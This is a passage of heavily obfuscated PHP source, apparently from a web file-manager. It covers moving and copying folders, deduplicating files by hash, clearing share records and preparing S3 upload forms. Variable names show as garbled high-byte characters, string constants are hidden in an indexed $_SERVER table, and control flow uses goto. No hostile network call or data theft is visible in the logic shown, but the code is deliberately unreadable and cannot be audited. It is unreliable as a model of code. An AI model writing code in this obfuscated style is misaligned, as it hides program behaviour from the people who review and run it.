$‹²öĞ˜ê[648] => intval($ß¾ó¯²[$‹²öĞ˜ê[190]]), $‹²öĞ˜ê[649] => intval($ß¾ó¯²[$‹²öĞ˜ê[569]]), $‹²öĞ˜ê[650] => intval(USER_ID), $‹²öĞ˜ê[651] => intval(USER_ID), $‹²öĞ˜ê[477] => intval($ß¾ó¯²[$‹²öĞ˜ê[193]]), $‹²öĞ˜ê[652] => $ß¾ó¯²[$‹²öĞ˜ê[584]] . $ß¾ó¯²[$‹²öĞ˜ê[193]] . $‹²öĞ˜ê[50], $‹²öĞ˜ê[498] => $Òãá´¤ê[$‹²öĞ˜ê[88]] ? $Òãá´¤ê[$‹²öĞ˜ê[88]] : time(), $‹²öĞ˜ê[504] => 0, $‹²öĞ˜ê[653] => $‹²öĞ˜ê[12]); return $ûş¯ïŞ; } private function _copyApplyMeta($ë±£ùñ, &$ğğª™Œ›) { $äÌæğè¤ =& $_SERVER[¢ñàß¿€]; $­ä¥öÅ = $ë±£ùñ[$äÌæğè¤[193]]; $îÍ¬…¨§ = $ë±£ùñ[$äÌæğè¤[32]]; if (!isset($ë±£ùñ[$äÌæğè¤[654]]) || !$ë±£ùñ[$äÌæğè¤[654]] || $ë±£ùñ[$äÌæğè¤[654]] == $äÌæğè¤[228]) { $ğğª™Œ›[$äÌæğè¤[631]][] = array($äÌæğè¤[193], $­ä¥öÅ, $äÌæğè¤[654], short_id($­ä¥öÅ)); } if (Input::check($îÍ¬…¨§, $äÌæğè¤[655])) { $ğğª™Œ›[$äÌæğè¤[630]][] = array($äÌæğè¤[193] => $­ä¥öÅ, $äÌæğè¤[97] => $äÌæğè¤[538], $äÌæğè¤[450] => str_replace($äÌæğè¤[53], $äÌæğè¤[12], Pinyin::get($îÍ¬…¨§))); $ğğª™Œ›[$äÌæğè¤[630]][] = array($äÌæğè¤[193] => $­ä¥öÅ, $äÌæğè¤[97] => $äÌæğè¤[537], $äÌæğè¤[450] => Pinyin::get($îÍ¬…¨§, $äÌæğè¤[656])); } $ğğª™Œ›[$äÌæğè¤[630]][] = array($äÌæğè¤[193] => $­ä¥öÅ, $äÌæğè¤[97] => $äÌæğè¤[517], $äÌæğè¤[450] => KodSort::makeStr($îÍ¬…¨§)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($È“»Ş£Ñ) { $ï­Ê“¨å =& $_SERVER[¢ñàß¿€]; $ĞŒ ššè = $this->sourceInfo($È“»Ş£Ñ); $­»éÎáñ = $ï­Ê“¨å[657]; $•èô¾ò™ = array($ï­Ê“¨å[584] => array($ï­Ê“¨å[612], $ĞŒ ššè[$ï­Ê“¨å[584]] . $È“»Ş£Ñ . $ï­Ê“¨å[613]), $ï­Ê“¨å[505] => $this->targetIsDelete); $•Èöö† = $this->field($­»éÎáñ)->where($•èô¾ò™)->select(); if (!$•Èöö†) { return; } $•Èöö† = array_to_keyvalue($•Èöö†, $ï­Ê“¨å[193]); foreach ($•Èöö† as $éÄ ×á®) { $¯´½Ê« = $éÄ ×á®[$ï­Ê“¨å[192]]; $È“»Ş£Ñ = $éÄ ×á®[$ï­Ê“¨å[193]]; if (!isset($this->_childrenListCache[$È“»Ş£Ñ]) && $éÄ ×á®[$ï­Ê“¨å[485]] == $ï­Ê“¨å[91]) { $this->_childrenListCache[$È“»Ş£Ñ] = array(); } if (!isset($this->_childrenListCache[$¯´½Ê«])) { $this->_childrenListCache[$¯´½Ê«] = array(); } $this->_childrenListCache[$¯´½Ê«][$È“»Ş£Ñ] = $éÄ ×á®; $this->_childrenItemCache[$È“»Ş£Ñ] = $éÄ ×á®; } } private function _childrenListAll($‘ùÍê±½, &$ù×‰–¬×) { $ğ§İ³úè =& $_SERVER[¢ñàß¿€]; if (!isset($this->_childrenListCache[$‘ùÍê±½])) { return; } $Ôº’ö€ø = $this->_childrenListCache[$‘ùÍê±½]; foreach ($Ôº’ö€ø as $³‘±ª¢Û => $û„É†•) { $ù×‰–¬×[$³‘±ª¢Û] = $û„É†•; if ($û„É†•[$ğ§İ³úè[485]] == $ğ§İ³úè[91]) { $this->_childrenListAll($³‘±ª¢Û, $ù×‰–¬×); } } } private function sourceInfoCache($éÔä©À) { if (isset($this->_childrenItemCache[$éÔä©À])) { return $this->_childrenItemCache[$éÔä©À]; } return $this->sourceInfo($éÔä©À); } private function _childrenList($Ö…à›„ô) { if (isset($this->_childrenListCache[$Ö…à›„ô])) { return $this->_childrenListCache[$Ö…à›„ô]; } return $this->_childrenListSelect($Ö…à›„ô); } private function _childrenListSelect($ŒëÖûÌ¨) { $Ó‹¹„®Û =& $_SERVER[¢ñàß¿€]; $Ñ¢Å„¨í = array($Ó‹¹„®Û[192] => $ŒëÖûÌ¨, $Ó‹¹„®Û[505] => $this->targetIsDelete); $ĞÚ«ŞÍÍ = $this->where($Ñ¢Å„¨í)->select(); $ĞÚ«ŞÍÍ = $ĞÚ«ŞÍÍ ? $ĞÚ«ŞÍÍ : array(); $½Î‡Š»š = array_to_keyvalue($ĞÚ«ŞÍÍ, $Ó‹¹„®Û[193]); $this->_childrenListCache[$ŒëÖûÌ¨] = $½Î‡Š»š; foreach ($½Î‡Š»š as $ŒëÖûÌ¨ => $Šƒ„Œç) { $this->_childrenItemCache[$ŒëÖûÌ¨] = $Šƒ„Œç; } return $½Î‡Š»š; } private function fileNameExistAuto($ê«Ú¡Îñ, $×•Ëä¿) { $Ó…½„êµ =& $_SERVER[¢ñàß¿€]; if ($×•Ëä¿[$Ó…½„êµ[505]] == $Ó…½„êµ[91]) { return $this->fileNameExist($ê«Ú¡Îñ, $×•Ëä¿[$Ó…½„êµ[32]]); } return $this->fileNameExistCache($ê«Ú¡Îñ, $×•Ëä¿[$Ó…½„êµ[32]]); } private function fileNameExistCache($ßêè”Øê, $Ê£ÕŒú) { $“ÙıÃ»¾ =& $_SERVER[¢ñàß¿€]; $Ê£ÕŒú = strtolower($Ê£ÕŒú); $÷Æ™°‘Å = $this->_childrenList($ßêè”Øê); foreach ($÷Æ™°‘Å as $¥²ô˜§È) { if ($Ê£ÕŒú == strtolower($¥²ô˜§È[$“ÙıÃ»¾[32]])) { return $¥²ô˜§È[$“ÙıÃ»¾[193]]; } } return !1; } private function fileNameAutoCache($ÖÅ»©÷ö, $ë¦Õ†šØ, $èèˆÖ§², $ä§Ş‹©Ä) { $¬‹ÊóáØ =& $_SERVER[¢ñàß¿€]; $’ÎÏ¯·± = $this->_childrenList($ÖÅ»©÷ö); $ƒËåƒÅá = array_to_keyvalue($’ÎÏ¯·±, $¬‹ÊóáØ[12], $¬‹ÊóáØ[32]); return $this->fileNameAutoGet($ƒËåƒÅá, $ë¦Õ†šØ, $èèˆÖ§², $ä§Ş‹©Ä); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($°Õ‚“œ, $¢¤ÄÇ¼™, $İ©Øæ = REPEAT_REPLACE, $çÂ¶®±× = '') { $÷ß¨Ó€Ÿ =& $_SERVER[¢ñàß¿€]; $²““Œœ = $this->sourceInfo($°Õ‚“œ); $™ÉÉë = $this->sourceInfo($¢¤ÄÇ¼™); if ($²““Œœ[$÷ß¨Ó€Ÿ[192]] == $™ÉÉë[$÷ß¨Ó€Ÿ[193]]) { if ($²““Œœ[$÷ß¨Ó€Ÿ[505]] == $÷ß¨Ó€Ÿ[91]) { Model($÷ß¨Ó€Ÿ[503])->restore(array($°Õ‚“œ)); } if (!$çÂ¶®±× || $çÂ¶®±× == $²““Œœ[$÷ß¨Ó€Ÿ[32]]) { return $°Õ‚“œ; } } $ñû–ÕÍ” = $this->pathInfoMore($°Õ‚“œ); if ($this->isParentOf($°Õ‚“œ, $¢¤ÄÇ¼™)) { return !1; } if (!$²““Œœ || !$™ÉÉë || $™ÉÉë[$÷ß¨Ó€Ÿ[485]] != $÷ß¨Ó€Ÿ[91]) { return !1; } Hook::trigger($÷ß¨Ó€Ÿ[658], $ñû–ÕÍ”); $this->targetIsDelete = intval($²““Œœ[$÷ß¨Ó€Ÿ[505]]); if ($²““Œœ[$÷ß¨Ó€Ÿ[192]] == $¢¤ÄÇ¼™ && $çÂ¶®±× != $²““Œœ[$÷ß¨Ó€Ÿ[32]]) { $Üùè½© = $this->fileNameExist($¢¤ÄÇ¼™, $çÂ¶®±×); if ($Üùè½© && $²““Œœ[$÷ß¨Ó€Ÿ[485]] == $÷ß¨Ó€Ÿ[228]) { $²ÓÄ´úä = $this->sourceInfo($Üùè½©); $ŸòäÅ¡ = $this->fileHistory($²ÓÄ´úä, $²““Œœ[$÷ß¨Ó€Ÿ[541]], $²““Œœ[$÷ß¨Ó€Ÿ[79]]); if (!$ŸòäÅ¡) { Model($÷ß¨Ó€Ÿ[544])->remove($²““Œœ[$÷ß¨Ó€Ÿ[541]]); } $this->removeNow($°Õ‚“œ, !1); $this->folderSizeReset($¢¤ÄÇ¼™); Hook::trigger($÷ß¨Ó€Ÿ[659], $ñû–ÕÍ”); return $Üùè½©; } } $ªª€·ÄŠ = $çÂ¶®±× ? $çÂ¶®±× : $²““Œœ[$÷ß¨Ó€Ÿ[32]]; $this->lockMoveStart($°Õ‚“œ); $this->lockWriteStart($¢¤ÄÇ¼™, $ªª€·ÄŠ); $§–ñ°ğ— = array($÷ß¨Ó€Ÿ[629] => array(), $÷ß¨Ó€Ÿ[660] => !1); $this->clearShare($°Õ‚“œ, $¢¤ÄÇ¼™); $ï¿ã•¢ = $this->fileNameExistAuto($¢¤ÄÇ¼™, $²““Œœ); $ÃüÒ…Ó¸ = $this->_move($°Õ‚“œ, $¢¤ÄÇ¼™, $İ©Øæ, $§–ñ°ğ—, $çÂ¶®±×); $this->sourceCacheClear(); if ($²““Œœ[$÷ß¨Ó€Ÿ[485]] == $÷ß¨Ó€Ÿ[91] && $ï¿ã•¢) { $this->folderSizeResetChildren($ÃüÒ…Ó¸); } Model($÷ß¨Ó€Ÿ[230])->linkAdd($§–ñ°ğ—[$÷ß¨Ó€Ÿ[629]]); if ($ï¿ã•¢ && $§–ñ°ğ—[$÷ß¨Ó€Ÿ[660]]) { $this->removeNow($°Õ‚“œ, !1); } $this->lockMoveEnd($°Õ‚“œ); $this->lockWriteEnd($¢¤ÄÇ¼™, $ªª€·ÄŠ); $this->folderSizeReset($²““Œœ[$÷ß¨Ó€Ÿ[192]]); $this->folderSizeReset($¢¤ÄÇ¼™); $ÙõÈŸŒø = array($²““Œœ[$÷ß¨Ó€Ÿ[192]], $¢¤ÄÇ¼™); if ($²““Œœ[$÷ß¨Ó€Ÿ[485]] == $÷ß¨Ó€Ÿ[91]) { $ÙõÈŸŒø[] = $°Õ‚“œ; } $this->updateModifyTime($ÙõÈŸŒø); Model($÷ß¨Ó€Ÿ[633])->eventMove($°Õ‚“œ, $²““Œœ[$÷ß¨Ó€Ÿ[192]], $¢¤ÄÇ¼™); Hook::trigger($÷ß¨Ó€Ÿ[659], $ñû–ÕÍ”); return $ÃüÒ…Ó¸; } private function _move($Üì¥¸Öä, $¥üĞ¢Íµ, $‚œ«¥¶‘, &$è±‹¼ê·, $ÃØ÷Ì¹Ú = '') { $£îâ¸”È =& $_SERVER[¢ñàß¿€]; $×‹¬ÊòÛ = $this->sourceInfo($Üì¥¸Öä); $–Óö”‹Ñ = $×‹¬ÊòÛ[$£îâ¸”È[485]] == $£îâ¸”È[91]; $—§„Ëéˆ = $ÃØ÷Ì¹Ú ? $ÃØ÷Ì¹Ú : $×‹¬ÊòÛ[$£îâ¸”È[32]]; $©‘Òê— = $this->fileNameExistAuto($¥üĞ¢Íµ, $×‹¬ÊòÛ); $this->lockMoveStart($Üì¥¸Öä); $this->lockWriteStart($¥üĞ¢Íµ, $—§„Ëéˆ); if (!$©‘Òê—) { return $this->_moveForce($Üì¥¸Öä, $¥üĞ¢Íµ, $—§„Ëéˆ); } $‚øæóä« = $©‘Òê—; $‹ø½‚È« = !1; if ($–Óö”‹Ñ) { if ($‚œ«¥¶‘ == REPEAT_RENAME_FOLDER) { $—§„Ëéˆ = $this->fileNameAuto($¥üĞ¢Íµ, $—§„Ëéˆ, $‚œ«¥¶‘, $–Óö”‹Ñ); $‚øæóä« = $this->_moveForce($Üì¥¸Öä, $¥üĞ¢Íµ, $—§„Ëéˆ); } else { if ($‚œ«¥¶‘ == REPEAT_RENAME_FOLDER) { $‚œ«¥¶‘ = REPEAT_RENAME; } $©Ñæ€— = $this->_childrenListSelect($Üì¥¸Öä); foreach ($©Ñæ€— as $÷ÁœŠó) { $this->_move($÷ÁœŠó[$£îâ¸”È[193]], $©‘Òê—, $‚œ«¥¶‘, $è±‹¼ê·); } $‹ø½‚È« = !0; } } else { if ($‚œ«¥¶‘ == REPEAT_SKIP) { $‹ø½‚È« = !0; } else { if ($‚œ«¥¶‘ == REPEAT_RENAME || $‚œ«¥¶‘ == REPEAT_RENAME_FOLDER) { $—§„Ëéˆ = $this->fileNameAuto($¥üĞ¢Íµ, $—§„Ëéˆ, $‚œ«¥¶‘, $–Óö”‹Ñ); $‚øæóä« = $this->_moveForce($Üì¥¸Öä, $¥üĞ¢Íµ, $—§„Ëéˆ); } else { if ($‚œ«¥¶‘ == REPEAT_REPLACE) { $ÉÏåò³ã = $this->sourceInfoCache($©‘Òê—); $µòÀá¹¿ = $this->fileHistory($ÉÏåò³ã, $×‹¬ÊòÛ[$£îâ¸”È[541]], $×‹¬ÊòÛ[$£îâ¸”È[79]]); $‹ø½‚È« = !0; if ($µòÀá¹¿) { $è±‹¼ê·[$£îâ¸”È[629]][] = $×‹¬ÊòÛ[$£îâ¸”È[541]]; } } } } } if ($‹ø½‚È« && !$è±‹¼ê·[$£îâ¸”È[660]]) { $è±‹¼ê·[$£îâ¸”È[660]] = !0; } return $‚øæóä«; } private function _moveForce($Şœ‰€ş², $Õ×¿¬Šø, $ø¦„ËŒÊ) { $ş¸£İµ =& $_SERVER[¢ñàß¿€]; $Éì£©åû = $this->sourceInfo($Şœ‰€ş²); $±Ïè•‰Á = $this->sourceInfo($Õ×¿¬Šø); $¼ÎÛâò¶ = $Éì£©åû[$ş¸£İµ[485]] == $ş¸£İµ[91]; $êÂË£µ = array($ş¸£İµ[477] => $±Ïè•‰Á[$ş¸£İµ[193]], $ş¸£İµ[652] => $±Ïè•‰Á[$ş¸£İµ[584]] . $±Ïè•‰Á[$ş¸£İµ[193]] . $ş¸£İµ[50], $ş¸£İµ[648] => $±Ïè•‰Á[$ş¸£İµ[190]], $ş¸£İµ[649] => $±Ïè•‰Á[$ş¸£İµ[569]], $ş¸£İµ[651] => USER_ID, $ş¸£İµ[494] => $ø¦„ËŒÊ); $òú“ÂŞ = $Éì£©åû[$ş¸£İµ[190]] == SourceModel::TYPE_GROUP && $±Ïè•‰Á[$ş¸£İµ[190]] == SourceModel::TYPE_GROUP && $Éì£©åû[$ş¸£İµ[569]] == $±Ïè•‰Á[$ş¸£İµ[569]]; if (!$òú“ÂŞ && $this->moveClearAuth) { Model($ş¸£İµ[567])->authClear($Şœ‰€ş²); } $ÚÕßÛ®Â = $Éì£©åû[$ş¸£İµ[505]] == $ş¸£İµ[91] && $±Ïè•‰Á[$ş¸£İµ[505]] != $ş¸£İµ[91]; if ($ÚÕßÛ®Â) { $êÂË£µ[$ş¸£İµ[504]] = 0; } if ($¼ÎÛâò¶) { $‹ª­½óŒ = array($ş¸£İµ[652] => array($ş¸£İµ[612], $Éì£©åû[$ş¸£İµ[584]] . $Éì£©åû[$ş¸£İµ[193]] . $ş¸£İµ[613])); $Ü¹®ÜÛÈ = $Éì£©åû[$ş¸£İµ[584]] . $Éì£©åû[$ş¸£İµ[193]] . $ş¸£İµ[50]; $¢Öñı³ß = $±Ïè•‰Á[$ş¸£İµ[584]] . $±Ïè•‰Á[$ş¸£İµ[193]] . $ş¸£İµ[50] . $Éì£©åû[$ş¸£İµ[193]] . $ş¸£İµ[50]; $òğ¨Š° = array($ş¸£İµ[652] => array($ş¸£İµ[661], "\x72\145\160\154\x61\143\145\50\x70\x61\x72\145\x6e\164\x4c\145\x76\x65\154\x2c\47{$Ü¹®ÜÛÈ}\47\x2c\x27{$¢Öñı³ß}\x27\x29"), $ş¸£İµ[648] => $±Ïè•‰Á[$ş¸£İµ[190]], $ş¸£İµ[649] => $±Ïè•‰Á[$ş¸£İµ[569]]); if ($ÚÕßÛ®Â) { $òğ¨Š°[$ş¸£İµ[504]] = 0; } $this->where($‹ª­½óŒ)->data($òğ¨Š°)->save(); } $this->where(array($ş¸£İµ[491] => $Şœ‰€ş²))->data($êÂË£µ)->save(); return $Şœ‰€ş²; } private function clearShare($¿íå˜Â, $ Ãİ©²ì) { $Òè²ğšè =& $_SERVER[¢ñàß¿€]; $Ÿê©‚Õ¨ = $this->sourceInfo($¿íå˜Â); $¢Û˜ÀŠ = $this->sourceInfo($ Ãİ©²ì); if ($Ÿê©‚Õ¨[$Òè²ğšè[569]] == $¢Û˜ÀŠ[$Òè²ğšè[569]] && $Ÿê©‚Õ¨[$Òè²ğšè[190]] == $Òè²ğšè[662]) { return; } $­¡ÊÍ = array($Òè²ğšè[584] => array($Òè²ğšè[612], $Ÿê©‚Õ¨[$Òè²ğšè[584]] . $¿íå˜Â . $Òè²ğšè[613])); $œ»¾…Ûš = $this->field($Òè²ğšè[491])->where($­¡ÊÍ)->getField($Òè²ğšè[193], !0); if (!$œ»¾…Ûš) { return; } $­¡ÊÍ = array($Òè²ğšè[193] => array($Òè²ğšè[7], $œ»¾…Ûš), $Òè²ğšè[663] => 1); $¹„¹—óê = Model($Òè²ğšè[664])->field($Òè²ğšè[665])->where($­¡ÊÍ)->select(); if (!$¹„¹—óê) { return; } $¹„¹—óê = array_to_keyvalue($¹„¹—óê, $Òè²ğšè[12], $Òè²ğšè[665]); $­¡ÊÍ = array($Òè²ğšè[665] => array($Òè²ğšè[7], $¹„¹—óê)); Model($Òè²ğšè[664])->where($­¡ÊÍ)->save(array($Òè²ğšè[663] => 0)); Model($Òè²ğšè[666])->where($­¡ÊÍ)->delete(); } public function copyFolderFromIO($û¤¥ü‘¶, $òèˆ¿ì», $´œ‹Ç½, $¡İ¨Ü÷Ü, $ÀÓí½ªß, $“»ºÍƒ¸ = false) { $«ˆÊ–‹ =& $_SERVER[¢ñàß¿€]; $×ÈßÓÇ— = array($«ˆÊ–‹[630] => array(), $«ˆÊ–‹[631] => array(), $«ˆÊ–‹[629] => array(), $«ˆÊ–‹[667] => array()); $Ù½ÈÆë = $“»ºÍƒ¸ ? $“»ºÍƒ¸ : $û¤¥ü‘¶->pathThis($òèˆ¿ì»); $¢Îí”¦ë = $this->fileNameExist($´œ‹Ç½, $Ù½ÈÆë); $Øª¾”Ê£ = $this->mkdir($´œ‹Ç½, $Ù½ÈÆë, $¡İ¨Ü÷Ü); if (!$¢Îí”¦ë || $¡İ¨Ü÷Ü == REPEAT_RENAME_FOLDER) { $¡İ¨Ü÷Ü = !1; } if ($¢Îí”¦ë) { $this->_childrenAllMake($¢Îí”¦ë); } Hook::trigger($«ˆÊ–‹[668]); $this->_copyChildTo($û¤¥ü‘¶, $òèˆ¿ì», $Øª¾”Ê£, $¡İ¨Ü÷Ü, $×ÈßÓÇ—, $ÀÓí½ªß); Hook::trigger($«ˆÊ–‹[669]); if ($Øª¾”Ê£) { $this->folderSizeResetChildren($Øª¾”Ê£); } $this->_childrenListClear(); Model($«ˆÊ–‹[632])->addAll($×ÈßÓÇ—[$«ˆÊ–‹[630]], array(), !0); Model($«ˆÊ–‹[633])->eventCopy($Øª¾”Ê£); $this->saveAll($×ÈßÓÇ—[$«ˆÊ–‹[631]]); Model($«ˆÊ–‹[544])->linkAdd($×ÈßÓÇ—[$«ˆÊ–‹[629]]); Model($«ˆÊ–‹[544])->remove($×ÈßÓÇ—[$«ˆÊ–‹[667]]); $this->folderSizeReset($´œ‹Ç½); $this->updateModifyTime($´œ‹Ç½); return $Øª¾”Ê£; } private function _copyChildTo($Ñáô²Ôç, $à¾Ìé·, $Œøì³ßË, $¤ãŠòÕ, &$ìéÁ¼§, $–½ˆ‰ô) { $ºÃÜÍİ¿ =& $_SERVER[¢ñàß¿€]; $¥º”ËÚ = $this->sourceInfoCache($Œøì³ßË); $ü‰ßƒˆ‰ = $Ñáô²Ôç->listPath($à¾Ìé·); $ü‰ßƒˆ‰ = $ü‰ßƒˆ‰ ? $ü‰ßƒˆ‰ : array($ºÃÜÍİ¿[86] => array(), $ºÃÜÍİ¿[85] => array()); $ıÒ­êÑş = array_merge($ü‰ßƒˆ‰[$ºÃÜÍİ¿[86]], $ü‰ßƒˆ‰[$ºÃÜÍİ¿[85]]); $’Åèøëï = $this->_addFiles($Ñáô²Ôç, $ü‰ßƒˆ‰[$ºÃÜÍİ¿[86]], $–½ˆ‰ô); $ıûµ‹² = array(); foreach ($ıÒ­êÑş as &$•á›˜°³) { if (isset($’Åèøëï[$•á›˜°³[$ºÃÜÍİ¿[32]]])) { $•á›˜°³ = $’Åèøëï[$•á›˜°³[$ºÃÜÍİ¿[32]]]; } $•á›˜°³[$ºÃÜÍİ¿[485]] = $•á›˜°³[$ºÃÜÍİ¿[33]] == $ºÃÜÍİ¿[78]; $•á›˜°³[$ºÃÜÍİ¿[486]] = substr(_get($•á›˜°³, $ºÃÜÍİ¿[169], $ºÃÜÍİ¿[12]), 0, 10); $•á›˜°³[$ºÃÜÍİ¿[79]] = _get($•á›˜°³, $ºÃÜÍİ¿[79], 0); $•á›˜°³[$ºÃÜÍİ¿[541]] = _get($•á›˜°³, $ºÃÜÍİ¿[541], 0); if (!isset($•á›˜°³[$ºÃÜÍİ¿[670]]) && $•á›˜°³[$ºÃÜÍİ¿[541]]) { $ìéÁ¼§[$ºÃÜÍİ¿[667]][] = $•á›˜°³[$ºÃÜÍİ¿[541]]; } if ($¤ãŠòÕ) { $ßı¼Ÿ¶ = $this->fileNameExistCache($Œøì³ßË, $•á›˜°³[$ºÃÜÍİ¿[32]]); if ($ßı¼Ÿ¶) { if ($•á›˜°³[$ºÃÜÍİ¿[485]] || $¤ãŠòÕ == REPEAT_SKIP) { continue; } if ($¤ãŠòÕ == REPEAT_REPLACE) { $´–â‚®Á = $this->sourceInfoCache($ßı¼Ÿ¶); $°ŒÖçë = $this->fileHistory($´–â‚®Á, $•á›˜°³[$ºÃÜÍİ¿[541]], $•á›˜°³[$ºÃÜÍİ¿[79]]); if ($°ŒÖçë) { $ìéÁ¼§[$ºÃÜÍİ¿[629]][] = $•á›˜°³[$ºÃÜÍİ¿[541]]; } continue; } else { if ($¤ãŠòÕ == REPEAT_RENAME) { $•á›˜°³[$ºÃÜÍİ¿[32]] = $this->fileNameAutoCache($Œøì³ßË, $•á›˜°³[$ºÃÜÍİ¿[32]], $¤ãŠòÕ, !1); } } } } if (!$•á›˜°³[$ºÃÜÍİ¿[485]] && $•á›˜°³[$ºÃÜÍİ¿[541]] == 0) { continue; } if (!$•á›˜°³[$ºÃÜÍİ¿[485]] && $•á›˜°³[$ºÃÜÍİ¿[541]]) { $ìéÁ¼§[$ºÃÜÍİ¿[629]][] = $•á›˜°³[$ºÃÜÍİ¿[541]]; } $ıûµ‹²[] = $this->_makeItemData($•á›˜°³, $¥º”ËÚ, $•á›˜°³[$ºÃÜÍİ¿[32]]); } unset($•á›˜°³); if (!empty($ıûµ‹²)) { $this->addAll($ıûµ‹²); $this->_childrenListSelect($Œøì³ßË); } $¯«‰˜æº = $this->_childrenList($Œøì³ßË); $¯«‰˜æº = array_to_keyvalue($¯«‰˜æº, $ºÃÜÍİ¿[32]); foreach ($ıÒ­êÑş as $•á›˜°³) { $´–â‚®Á = $¯«‰˜æº[$•á›˜°³[$ºÃÜÍİ¿[32]]]; $øí¥ûû = $´–â‚®Á[$ºÃÜÍİ¿[193]]; $this->_copyApplyMeta($´–â‚®Á, $ìéÁ¼§); if ($•á›˜°³[$ºÃÜÍİ¿[33]] == $ºÃÜÍİ¿[78]) { $•á›˜°³[$ºÃÜÍİ¿[87]] = $Ñáô²Ôç->getPathInner($•á›˜°³[$ºÃÜÍİ¿[87]]); $this->_copyChildTo($Ñáô²Ôç, $•á›˜°³[$ºÃÜÍİ¿[87]], $øí¥ûû, $¤ãŠòÕ, $ìéÁ¼§, $–½ˆ‰ô); } } } private function _addFiles($·¬«’÷, $ßË‚ûÉÇ, $’¡áõ®”) { $ÉåØı§€ =& $_SERVER[¢ñàß¿€]; if (!$ßË‚ûÉÇ || count($ßË‚ûÉÇ) == 0) { return array(); } $‰ãÄõ®² = array(); foreach ($ßË‚ûÉÇ as &$¾´Æåõ¡) { Hook::trigger($ÉåØı§€[671], $¾´Æåõ¡); $¾´Æåõ¡[$ÉåØı§€[87]] = $·¬«’÷->getPathInner($¾´Æåõ¡[$ÉåØı§€[87]]); $´êê‚ = $·¬«’÷->hashSimple($¾´Æåõ¡[$ÉåØı§€[87]]); $¥ƒóéÜ = $·¬«’÷->hashMd5($¾´Æåõ¡[$ÉåØı§€[87]]); if (strlen($¥ƒóéÜ) > 10 && !isset($‰ãÄõ®²[$¥ƒóéÜ])) { $‰ãÄõ®²[$¥ƒóéÜ] = array(); } $¾´Æåõ¡[$ÉåØı§€[672]] = $´êê‚; $¾´Æåõ¡[$ÉåØı§€[547]] = $¥ƒóéÜ; $‰ãÄõ®²[$¥ƒóéÜ][] =& $¾´Æåõ¡; if (count($‰ãÄõ®²[$¥ƒóéÜ]) > 1) { $¾´Æåõ¡[$ÉåØı§€[670]] = !0; } Hook::trigger($ÉåØı§€[673], $¾´Æåõ¡); } unset($¾´Æåõ¡); $î¹ƒŒ–² = array($ÉåØı§€[547] => array($ÉåØı§€[7], array_keys($‰ãÄõ®²))); $Î‹·¸„È = Model($ÉåØı§€[674]); $ªûÒ£úÓ = $Î‹·¸„È->where($î¹ƒŒ–²)->select(); $ªûÒ£úÓ = $ªûÒ£úÓ ? $ªûÒ£úÓ : array(); foreach ($ªûÒ£úÓ as $À¬£ñ±) { if (!isset($‰ãÄõ®²[$À¬£ñ±[$ÉåØı§€[547]]])) { continue; } $ÌƒÁûİ = $‰ãÄõ®²[$À¬£ñ±[$ÉåØı§€[547]]]; foreach ($ÌƒÁûİ as &$¾´Æåõ¡) { $¾´Æåõ¡[$ÉåØı§€[541]] = $À¬£ñ±[$ÉåØı§€[541]]; $¾´Æåõ¡[$ÉåØı§€[670]] = !0; } unset($¾´Æåõ¡); } $ËéÔŞ«é = array(); foreach ($ßË‚ûÉÇ as $»‡Š•îõ) { Hook::trigger($ÉåØı§€[675], $»‡Š•îõ); if (isset($»‡Š•îõ[$ÉåØı§€[670]]) && $»‡Š•îõ[$ÉåØı§€[670]]) { Hook::trigger($ÉåØı§€[676], $»‡Š•îõ); continue; } $«„»¡Å– = $·¬«’÷->getPathInner($»‡Š•îõ[$ÉåØı§€[87]]); $ÙŞÜŞ­„ = $Î‹·¸„È->addFileMake($«„»¡Å–, $»‡Š•îõ[$ÉåØı§€[79]], $»‡Š•îõ[$ÉåØı§€[672]], $»‡Š•îõ[$ÉåØı§€[547]], $»‡Š•îõ[$ÉåØı§€[32]], $’¡áõ®”); Hook::trigger($ÉåØı§€[676], $»‡Š•îõ); if (!is_array($ÙŞÜŞ­„)) { continue; } $ËéÔŞ«é[] = $ÙŞÜŞ­„; } $Î‹·¸„È->addAll($ËéÔŞ«é); $î¹ƒŒ–² = array($ÉåØı§€[547] => array($ÉåØı§€[7], array_keys($‰ãÄõ®²))); $ªûÒ£úÓ = $Î‹·¸„È->where($î¹ƒŒ–²)->select(); $ªûÒ£úÓ = $ªûÒ£úÓ ? $ªûÒ£úÓ : array(); foreach ($ªûÒ£úÓ as $À¬£ñ±) { if (!isset($‰ãÄõ®²[$À¬£ñ±[$ÉåØı§€[547]]])) { continue; } $›Êí•î— =& $‰ãÄõ®²[$À¬£ñ±[$ÉåØı§€[547]]]; foreach ($›Êí•î— as &$¾´Æåõ¡) { $¾´Æåõ¡[$ÉåØı§€[541]] = $À¬£ñ±[$ÉåØı§€[541]]; } unset($¾´Æåõ¡); } $…º¦Ùµé = array(); foreach ($ßË‚ûÉÇ as $¬Õ„ĞÎ) { $…º¦Ùµé[$¬Õ„ĞÎ[$ÉåØı§€[32]]] = $¬Õ„ĞÎ; } return $…º¦Ùµé; } } define($_SERVER[¢ñàß¿€][677], $_SERVER[¢ñàß¿€][678]); $pxmfudlhsi = $_SERVER[¢ñàß¿€][679]; goto a¾­²‰²Œ²; Cß…“µÏø®: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¥ÂşÎ³) { parent::__construct($¥ÂşÎ³); $this->setSignVersion($_SERVER[¢ñàß¿€][247]); } public function uploadFormData($ğ¸Ò×¯š, $íÅ–Ø½ = 3600) { $¿·Ï‰ =& $_SERVER[¢ñàß¿€]; $óŞæñÍ = $¿·Ï‰[229]; $ÄÃÆé“ = $¿·Ï‰[270]; $“×‘Õí¼ = $¿·Ï‰[62]; $ñ¡°„ş = gmdate($¿·Ï‰[271]); $•“şêû = gmdate($¿·Ï‰[272]); $¬Ãø±Ñ¥ = $¿·Ï‰[273]; $Ûõµ¶“Ú = $íÅ–Ø½ . $¿·Ï‰[12]; $ºÁ¦İ‡ƒ = $¿·Ï‰[274]; $æƒ±¨§ş = array($this->accessKey, $•“şêû, $this->region, $“×‘Õí¼, $¬Ãø±Ñ¥); $åËÎ·¬° = implode($¿·Ï‰[8], $æƒ±¨§ş); $µ©Ãê›¢ = array($¿·Ï‰[275] => gmdate($¿·Ï‰[299], strtotime($¿·Ï‰[277])), $¿·Ï‰[278] => array(array($¿·Ï‰[279] => $this->bucket), array($¿·Ï‰[280] => $óŞæñÍ), array($¿·Ï‰[281], $¿·Ï‰[282], $¿·Ï‰[12]), array($¿·Ï‰[281], 